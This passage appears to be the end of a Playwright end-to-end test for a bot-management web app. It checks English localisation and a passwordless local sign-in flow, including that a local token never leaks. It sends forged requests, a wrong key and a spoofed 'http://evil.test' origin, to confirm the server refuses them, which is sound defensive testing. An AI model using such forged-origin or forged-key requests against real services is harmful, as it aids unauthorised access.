  // No animation pack, as on a fresh install: the test animations are 1×1 images and would leave blank avatars.
  await english.route('**/api/app-config', async (route) => {
    const response = await route.fetch()
    await route.fulfill({ response, json: { ...(await response.json()), animatedBots: [] } })
  })
  await english.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await english.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await english.getByRole('button', { name: 'Settings' }).waitFor({ timeout: 3_000 })
  await english.getByRole('button', { name: 'Activity', exact: true }).waitFor({ timeout: 3_000 })
  if (await english.evaluate(() => document.documentElement.lang) !== 'en') throw new Error('La langue du document doit suivre le système.')
  const frenchChrome = await english.locator('[aria-label], button').evaluateAll((nodes) => nodes.map((node) => node.getAttribute('aria-label') || node.textContent || '').filter((label) => /Réglages|Activité|Groupes|Se déconnecter|Au travail|Rechercher/.test(label)))
  if (frenchChrome.length) throw new Error(`Interface anglaise avec des libellés français : ${frenchChrome.slice(0, 5).join(' | ')}`)
  // The demo data follows the language too: sections, previews, messages and routines.
  await english.locator('.section-heading', { hasText: 'Build' }).first().waitFor({ timeout: 3_000 })
  await english.getByText('Give me a quick update.').waitFor({ timeout: 3_000 })
  await english.getByText('Morning briefing').waitFor({ timeout: 3_000 })
  const frenchDemo = await english.locator('body').evaluate((body) => /Atelier|Maison|Lecture|Voyage|Point du matin|factures/.exec(body.innerText)?.[0] || '')
  if (frenchDemo) throw new Error(`Démo anglaise avec des données en français : ${frenchDemo}`)
  await english.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await delay(900)
  await english.screenshot({ path: `${SCREENSHOTS}demo-english.png` })
  await english.close()
  if (await page.locator('.sidebar-filter-row').evaluate((row) => row.scrollWidth > row.clientWidth)) throw new Error('La ligne de filtres déborde de la sidebar.')
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
  await delay(700)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()

  // A gateway without a password, Hermes' default setup on one machine: the server signs in by itself,
  // for whoever holds its local key and for nobody else.
  localMode = true
  const stoppedForLocal = new Promise((resolve) => child.once('exit', resolve))
  child.kill('SIGTERM')
  await stoppedForLocal
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let localLog = ''
  child.stdout.on('data', (data) => { localLog += data })
  child.stderr.on('data', (data) => { localLog += data })
  for (let attempt = 0; attempt < 100 && !/\?key=/.test(localLog); attempt += 1) await delay(100)
  const localKey = /\/\?key=([A-Za-z0-9_-]{32,})/.exec(localLog)?.[1]
  if (!localKey) throw new Error(`Connexion sans mot de passe : lien absent des logs du serveur. ${localLog.slice(-400)}`)
  const localBase = 'http://127.0.0.1:4332'
  const localOptions = await (await fetch(`${localBase}/api/auth/options`)).json()
  if (localOptions.local?.available !== true) throw new Error(`Connexion sans mot de passe : ${JSON.stringify(localOptions.local)}`)

  // No key, a wrong key, a foreign origin: refused.
  localTokenSightings.length = 0
  const localPost = (headers) => fetch(`${localBase}/api/auth/local`, { method: 'POST', headers })
  const refusals = await Promise.all([
    localPost({ Origin: localBase }),
    localPost({ Origin: localBase, 'X-HermesBot-Local-Key': 'x'.repeat(43) }),
    localPost({ Origin: 'http://evil.test', 'X-HermesBot-Local-Key': localKey }),
    localPost({ 'X-HermesBot-Local-Key': localKey }),
  ])
  if (refusals.some((refusal) => refusal.status !== 403)) throw new Error(`Connexion sans mot de passe acceptée sans preuve : ${refusals.map((refusal) => refusal.status)}`)
  // Without a session of this app, no request carries the token: the server must not lend it to whoever reaches its port.
  for (const route of ['/api/auth/me', '/api/auth/providers', '/api/hermes/cron/jobs?profile=nova', '/api/hermes/analytics/usage?days=30&profile=nova', '/api/media?profile=nova&path=/tmp/image.png']) {
    const stranger = await fetch(`${localBase}${route}`)
    if ((await stranger.text()).includes(LOCAL_TOKEN)) throw new Error(`Jeton local dans la réponse de ${route}.`)
  }
  const strangerSocket = await new Promise((resolve) => {
    const socket = new WebSocket(`ws://127.0.0.1:4332/api/ws?profile=default`, 'hermes-gateway-v1', { headers: { Origin: localBase } })
    socket.on('open', () => { socket.close(); resolve('open') })
    socket.on('unexpected-response', (_request, response) => resolve(response.statusCode))
    socket.on('error', () => resolve('error'))
  })
  if (strangerSocket === 'open') throw new Error('WebSocket ouvert sans session locale.')
  if (localTokenSightings.length || localTickets) throw new Error(`Jeton local envoyé sans session : ${localTokenSightings.join(', ')}`)

  // With the key: a session, and the token stays on the server side.
  const localSignIn = await localPost({ Origin: localBase, 'X-HermesBot-Local-Key': localKey })
  const localCookie = (localSignIn.headers.getSetCookie()[0] || '').split(';')[0]
  if (localSignIn.status !== 200 || !localCookie.startsWith('hermesbot_session=') || (await localSignIn.text()).includes(LOCAL_TOKEN)) {
    throw new Error(`Connexion sans mot de passe refusée avec la clé : ${localSignIn.status}`)
  }
  const localMe = await fetch(`${localBase}/api/auth/me`, { headers: { cookie: localCookie } })
  const localMeText = await localMe.text()
  if (localMe.status !== 200 || !localMeText.includes('loopback') || localMeText.includes(LOCAL_TOKEN)) throw new Error(`Session sans mot de passe : ${localMe.status}`)
  if (!localTokenSightings.includes('/api/auth/me')) throw new Error('La session sans mot de passe n’a pas présenté le jeton à la gateway.')
  // Vault writes keep asking for a password session: a bot of the same account can read the token file.
  const localVault = await fetch(`${localBase}/api/browser-vault/entries/remove`, {
    method: 'POST', headers: { cookie: localCookie, Origin: localBase, 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'none' }),
  })
  if (localVault.status !== 401 && localVault.status !== 403) throw new Error(`Coffre ouvert en écriture à une session sans mot de passe : ${localVault.status}`)

  // In a browser: the sign-in link opens the bots with no form, and the key leaves the address bar.
  const localContext = await browser.newContext()
  const localPage = await localContext.newPage()
  await localPage.goto(`${localBase}/?key=${localKey}`)
  await localPage.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await localPage.locator('.login-card').count()) throw new Error('Formulaire affiché malgré le lien de connexion.')
  if (new URL(localPage.url()).search) throw new Error('La clé locale reste dans la barre d’adresse.')
  if (!localTickets || localSocketOrigins.some(Boolean)) throw new Error(`Socket sans mot de passe : ${localTickets} ticket(s), Origin « ${localSocketOrigins.join(', ')} ».`)
  if ((await localPage.content()).includes(LOCAL_TOKEN) || localLog.includes(LOCAL_TOKEN)) throw new Error('Jeton local visible dans la page ou dans les logs.')
  await localContext.close()
  // Without the key, a browser gets an explanation, not a password form that cannot work.
  const strangerContext = await browser.newContext()
  const strangerPage = await strangerContext.newPage()
  await strangerPage.goto(localBase)
  await strangerPage.locator('.login-local').waitFor({ timeout: 15_000 })
  if (await strangerPage.locator('input[type=password]').count()) throw new Error('Formulaire de mot de passe proposé à une gateway sans mot de passe.')
  await strangerContext.close()
  localMode = false

  if (errors.length) throw new Error(`Erreurs Chromium: ${errors.join(', ')}`)
  console.log('E2E OK: connexion sans mot de passe (clé locale, jeton jamais prêté), auth, WebSocket, roster, routines réelles, cache instantané, médias MEDIA: (galerie, vidéo Range, visionneuse, filtres, vidéo qui continue après le streaming), statut au travail et tour en arrière-plan, statut en veille et panneau sous-agents (subagent.roster, process.list, subagent.list, subagent.tail, événements subagent.*), NOREPLY jamais affiché en streaming, /model, contexte, tok/s, envoi, streaming, scroll libre, coupure 1006 et reconnexion, bouton de reconnexion (socket unique, réabonnement, gateway injoignable, session expirée), classement par groupes ou par activité, résumé du travail sans non-lu avant la fin, coffre gateway et accords, coffre CDP dans le trousseau (save, list, fill, code, bots autorisés, réglages, refus d’origine, journal sans secret, persistance), carte de mail, identifiants gardés, mentions @bot, glisser-déposer, documents en onglets (HTML isolé), onglet Usage, onglet Médias, message pendant le travail, raccourcis, modes BRAIN, PLAN et EXEC, mode caveman, écrans de chargement.')
} finally {
  if (browser) await browser.close()
  if (child) child.kill('SIGTERM')
  localControl.close()
  if (vaultService) vaultService.kill('SIGTERM')
  await execFileAsync('/usr/bin/security', ['delete-keychain', BROWSER_VAULT_KEYCHAIN]).catch(() => undefined)
  rmSync(BROWSER_VAULT_KEYCHAIN, { force: true })
  rmSync(BROWSER_VAULT_TOKEN, { force: true })
  wss.close()
  cdpWss.close()
  await new Promise((resolve) => mock.close(resolve))
  await new Promise((resolve) => cdpMock.close(resolve))
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
  rmSync(BROWSER_TOUR_FIXTURE, { force: true })
  rmSync(TEST_DATA, { recursive: true, force: true })
}
